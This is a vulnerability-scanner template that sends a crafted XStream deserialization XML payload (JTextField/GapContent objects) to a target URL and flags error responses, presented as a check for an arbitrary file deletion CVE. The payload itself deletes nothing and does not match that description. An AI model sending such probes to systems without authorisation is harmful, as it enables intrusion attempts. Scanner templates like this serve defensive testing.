id: CVE-2018-25080
info:
  name: XStream Arbitrary File Deletion â€“ CVE-2018-25080
  author: Piyush
  severity: high
  description: |
    XStream versions <= 1.4.19 allow attackers to delete arbitrary files
    via crafted XML input during deserialization.
  tags: xstream,deserialization,java,cve,oop

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: application/xml

    body: |
      <map>
        <entry>
          <string>javax.swing.JTextField</string>
          <javax.swing.JTextField>
            <text>test</text>
            <columns>10</columns>
            <document>
              <javax.swing.text.GapContent serialization="custom">
                <java.lang.String>test</java.lang.String>
                <int>0</int>
              </javax.swing.text.GapContent>
            </document>
          </javax.swing.JTextField>
        </entry>
      </map>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "XStream"
          - "conversion"
          - "java"

      - type: status
        status:
          - 400
          - 500
